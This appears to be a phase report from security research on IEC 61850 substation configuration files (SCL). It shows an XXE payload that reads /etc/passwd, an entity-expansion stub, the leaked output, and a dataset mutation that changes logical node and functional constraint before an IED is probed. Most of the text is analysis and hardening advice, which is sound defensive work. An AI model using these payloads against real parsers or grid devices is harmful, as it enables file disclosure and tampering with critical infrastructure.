# Phase 1: SCL Configuration & Schema Attack Surface

* **Target Plane:** Engineering / Configuration
* **Target Artifacts:** `.scd` / `.cid`
* **Protocol Context:** IEC 61850 Substation Configuration Language (SCL)
* **Objective:** Examine how SCL parsers and IED configuration workflows handle malicious XML constructs and mutations to the IEC 61850 information model.
* **Lab Action:** Generated and parsed malicious SCL XML, tested DTD entity expansion, and mutated FCDA mappings involving Functional Constraints and Logical Node classes before probing the target IED.

---

## Executive Summary

Phase 1 moved the research away from runtime packet traffic and into the **engineering trust boundary** that defines the IEC 61850 system before an IED ever begins communicating.

The first test targeted the XML parsing layer used to ingest SCL configuration. A crafted SCL document containing an inline DTD and an external entity referencing `file:///etc/passwd` was accepted by the target parsing engine. The parser expanded the entity and returned local filesystem content through the parsed XML structure.

This demonstrates an **implementation-specific XXE / external entity processing vulnerability** in the SCL ingestion pipeline. The IEC 61850 SCL format itself is not responsible for the vulnerability. The issue originates from how the implementation configures its underlying XML parser.

The second test examined the relationship between SCL configuration and the IEC 61850 information model. An FCDA definition was deliberately changed from:

```text
GGIO / MX
```

to:

```text
XCBR / ST
```

The mutation changed both the Logical Node class and Functional Constraint associated with the dataset member.

The modified configuration was then used during a probe against the target IED's ISO-on-TCP stack. The experiment establishes that SCL mutations can alter the model presented to downstream communication components. Full runtime consequences such as dataset binding failures and subscriber-side behavior require the mutated configuration to be instantiated and exercised against the corresponding MMS or GOOSE paths.

The central finding from Phase 1 is therefore:

```text
SCL Configuration
       ↓
Information Model
       ↓
Communication Bindings
       ↓
Runtime Behavior
```

SCL sits upstream of several later attack surfaces. Compromising or improperly validating this engineering layer can therefore change the assumptions under which MMS clients, GOOSE publishers, and GOOSE subscribers operate.

---

# 1. SCL as an Engineering Trust Boundary

IEC 61850 uses SCL to describe the structure and configuration of substation automation systems.

The configuration can define relationships involving:

```text
IEDs
 │
 ├── Logical Devices
 │
 ├── Logical Nodes
 │
 ├── Data Objects
 │
 ├── Data Attributes
 │
 ├── DataSets
 │
 └── Communication bindings
```

This makes SCL fundamentally different from a passive documentation file.

A simplified configuration path is:

```text
             SCL File
                │
                ▼
          XML Parser
                │
                ▼
       Configuration Model
                │
        ┌───────┼────────┐
        ▼       ▼        ▼
       IED     DataSet  Communication
       Model             Bindings
        │       │        │
        └───────┼────────┘
                ▼
          Configured IED
```

The parser therefore occupies an important trust boundary. If malicious XML is accepted during configuration loading, the attack occurs **before normal IEC 61850 communication security controls become relevant**.

# 2. Test 1.1: XML Parsing Resiliency

## 2.1 Attack Objective

The first test targeted the XML parser responsible for processing SCL configuration files.

The objective was to determine whether the implementation would process:

* Inline DTD declarations
* External entities
* Local filesystem references
* Entity expansion

The generated test document contained:

```xml
<!DOCTYPE SCL [
  <!ENTITY xxeTest SYSTEM "file:///etc/passwd">
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]>
```

The SCL document then referenced the external entity through the XML structure. The important point is that the malicious content remains syntactically XML. The attack occurs when the underlying parser decides how to process the DTD and entity declarations.

---

## 2.2 Observed Parser Reaction

The test harness reported:

```text
[+] Generated SCL Test Payload (XXE & Entity Expansion Probe)

<!DOCTYPE SCL [
  <!ENTITY xxeTest SYSTEM "file:///etc/passwd">
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]>
```

The parser subsequently expanded the entity reference and returned local filesystem content.

The resulting output included:

```text
root❌0:0:root:/root:/bin/bash
daemon:x...
```

The observed processing path was therefore:

```text
Malicious SCL
      │
      ▼
DTD Declaration
      │
      ▼
External Entity
      │
      ▼
file:///etc/passwd
      │
      ▼
XML Parser
      │
      ▼
Expanded XML Content
```

The important observation is not merely that the file existed. The parser **resolved an external system entity during SCL processing and incorporated the resulting content into the parsed document**.

---

# 3. Root Cause & Security Boundary

The observed behavior is consistent with an XML parser configuration that permits external entity resolution and DTD processing. This is an implementation problem rather than a defect in the IEC 61850 SCL specification. The relevant trust relationship is:

```text
Engineering User / Configuration Source
                 │
                 ▼
              SCL File
                 │
                 ▼
            XML Parser
                 │
          ┌──────┴──────┐
          ▼             ▼
      XML Model      Local System
```

If the parser is allowed to resolve arbitrary external entities, an attacker who can influence the SCL file can potentially cause the configuration-processing environment to access resources that were never intended to be part of the SCL document. In the laboratory environment, this resulted in local file content being incorporated into the parsed XML tree.

---

# 4. Entity Expansion Considerations

The payload also included an entity expansion component:

```xml
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
```

The purpose was to test whether the parser processes recursively referenced entities rather than rejecting DTD-based expansion outright.

The security implications are different:

```text
External Entity
        ↓
External Resource Access

Entity Expansion
        ↓
Parser Resource Consumption
```

The two behaviors should therefore not be treated as one vulnerability. The observed external entity resolution provides direct evidence of an **XXE-style file ingestion risk**. Entity expansion additionally represents a potential parser resource-consumption surface, although the limited laboratory payload does not by itself establish a denial-of-service threshold.

# 5. Test 1.2: Dataset & Logical Node Schema Mutation

## 5.1 Attack Objective

The second test examined whether modifying the SCL information model could create inconsistencies between the configured dataset definition and the model expected by downstream IEC 61850 communication components.

The original FCDA definition was:

```xml
<DataSet name="datasetAnalogValues">
  <FCDA
    ldInst="LD0"
    lnClass="GGIO"
    lnInst="1"
    doName="AnIn1"
    daName="mag.f"
    fc="MX"/>
</DataSet>
```

The configuration was deliberately mutated to:

```xml
<DataSet name="datasetAnalogValues">
  <FCDA
    ldInst="LD0"
    lnClass="XCBR"
    lnInst="1"
    doName="AnIn1"
    daName="mag.f"
    fc="ST"/>
</DataSet>
```

Two semantic properties were changed:

```text
Logical Node:
GGIO → XCBR

Functional Constraint:
MX → ST
```

The mutation therefore changes both the functional identity of the referenced Logical Node and the context in which the Data Attribute is interpreted.

---

# 6. Information-Model Drift

The original configuration describes:

```text
GGIO1
  │
  └── AnIn1
        │
        └── mag.f
             │
             └── MX
```

The mutated configuration instead describes:

```text
XCBR1
  │
  └── AnIn1
        │
        └── mag.f
             │
             └── ST
```

This is not simply a textual substitution.

The mutation changes the expected information model:

```text
Original
GGIO → Analog Input → MX

Mutated
XCBR → Status Object → ST
```

If a downstream component has already been configured around the original model, the two configurations no longer describe the same object.

The resulting condition can be represented as:

```text
Configured SCL Model
        │
        │ Expected Object
        ▼
      Object A
        ▲
        │
        │ Actual Runtime Model
        │
      Object B
```

This is the configuration-level equivalent of schema drift.

---

# 7. Interaction with the MMS Stack

Following the mutation, the test harness probed the target IED's ISO-on-TCP stack.

The execution output reported:

```text
[*] Probing target IED ISO-on-TCP stack inside namespace...
```

The generated test therefore reached the communication layer associated with the target IED rather than terminating at configuration generation. At this stage, however, the evidence establishes the **configuration mutation and subsequent ISO-on-TCP probing**, not a complete demonstration of a live MMS dataset failure.

This phase therefore records the schema mutation as the established observation and treats downstream runtime divergence as the next validation boundary.

---

# 8. Why the Dataset Mutation Matters

The experiment demonstrates why SCL integrity matters beyond the engineering workstation. DataSets provide a bridge between the IEC 61850 information model and several communication services.

Conceptually:

```text
Logical Model
      │
      ▼
   DataSet
      │
      ├──────────► MMS Reporting
      │
      ├──────────► GOOSE
      │
      └──────────► SV
```

A configuration that changes DataSet membership or object references can therefore alter the assumptions used by communication components.

The resulting attack surface is:

```text
SCL
 │
 ▼
DataSet Definition
 │
 ▼
Control / Communication Binding
 │
 ▼
Runtime Subscriber / Client
```

The important security property is that **configuration integrity precedes protocol integrity**. A perfectly validated GOOSE frame can still be interpreted incorrectly if the receiving device has been configured with the wrong dataset model. Likewise, an MMS client can operate correctly at the protocol level while addressing an information model that no longer corresponds to the intended engineering configuration.

# 9. Trust Boundary Analysis

Phase 1 exposes two distinct engineering trust boundaries.

### XML Processing Boundary

```text
Untrusted Configuration
          │
          ▼
       XML Parser
          │
          ▼
    Local System Access
```

The XXE test demonstrated that this boundary can cross from configuration parsing into local filesystem access when unsafe XML processing is enabled.

### Information-Model Boundary

```text
SCL Configuration
        │
        ▼
Information Model
        │
        ▼
DataSet / Communication Bindings
        │
        ▼
Runtime IED Behavior
```

The dataset mutation demonstrated how modifying SCL can change the expected information model before runtime communication is exercised.

These are separate vulnerabilities and should not be conflated:

```text
XXE
→ Parser / configuration-ingestion vulnerability

Schema Mutation
→ Configuration-integrity / model-consistency risk
```

# 10. Security Assessment

## 10.1 SCL Parser Exposure

The target parser accepted an inline DTD and resolved: `file:///etc/passwd` during SCL processing. This establishes an implementation-specific external entity processing vulnerability.

The security consequence can include:

```text
Local File Access
        ↓
Sensitive Configuration Exposure
        ↓
Potential Credential / Secret Disclosure
```

The actual impact depends on the privileges of the configuration-processing process and the files accessible to it.

---

## 10.2 Configuration Integrity

The dataset mutation demonstrates that SCL is part of the operational trust chain.

A malicious or incorrectly validated configuration can alter:

```text
Logical Node References
DataSet Membership
Functional Constraints
Communication Expectations
```

The security consequence is therefore broader than XML parser security alone. An attacker does not necessarily need to compromise the runtime communication channel if they can compromise the configuration that determines what the runtime system believes the communication model should be.

---

## 10.3 Configuration vs. Runtime Validation

The experiments highlight an important distinction:

```text
Valid XML
     ≠
Valid SCL Model
     ≠
Correct Runtime Configuration
     ≠
Correct Wire-Level Behavior
```

An SCL file can be syntactically accepted by an XML parser while still describing a semantically incorrect or malicious configuration. Likewise, a semantically valid configuration can still diverge from the behavior of a communicating peer.

Security validation therefore needs to operate across multiple layers:

```text
XML Syntax
    ↓
SCL Schema
    ↓
Information Model
    ↓
Communication Configuration
    ↓
Runtime Behavior
```

---

# 11. Hardening Considerations

SCL ingestion should be treated as a privileged configuration operation rather than an ordinary XML parsing task.

### XML Parser Hardening

The parser should:

* Disable external entity resolution.
* Disable unnecessary DTD processing.
* Prevent external resource fetching.
* Apply entity expansion limits.
* Reject malformed or unexpected XML constructs.
* Run configuration processing with the minimum required privileges.

The key security property is:

```text
SCL Parser
    │
    ├── Parse XML
    │
    └── No arbitrary external resource access
```

### Configuration Integrity

Engineering workflows should also protect:

* SCD files
* CID files
* ICD capability descriptions
* Dataset definitions
* Communication mappings
* IED configuration packages

Integrity controls can include:

```text
Authenticated Repository
        ↓
Change Control
        ↓
Configuration Validation
        ↓
Controlled Deployment
        ↓
IED
```

### Semantic Validation

SCL validation should go beyond checking whether the XML is syntactically valid.

The engineering process should verify that:

```text
Logical Node
      ↓
Data Object
      ↓
Data Attribute
      ↓
Functional Constraint
      ↓
DataSet
      ↓
Communication Binding
```

remain internally consistent. Where possible, the resulting configuration should also be compared against the expected runtime information model before deployment.

# Security Characteristics

Phase 1 establishes the **engineering layer as the first security boundary in the IEC 61850 communication chain**. The XXE experiment demonstrated that an unsafe SCL parser can cross the boundary between configuration data and the local operating system. The dataset mutation demonstrated a second boundary: **the SCL information model determines assumptions that later communication services depend upon**.

The most important findings are therefore:

* SCL ingestion is a privileged security boundary.
* XML parser behavior can expose the configuration-processing environment to external entity attacks.
* SCL mutations can alter Logical Node and DataSet semantics before runtime communication begins.
* Configuration integrity is therefore part of IEC 61850 protocol security.
* XML validity alone does not establish that an SCL configuration is semantically safe.
* Runtime MMS and GOOSE behavior must be validated against the configuration model rather than assumed to be correct because the SCL file was accepted.


With the engineering configuration boundary established, the next phase can move into the **MMS session itself**, where the research will examine how that configured information model becomes visible through TCP/102, how an MMS association is established, and how much of the IED namespace can be enumerated before meaningful authorization is encountered.
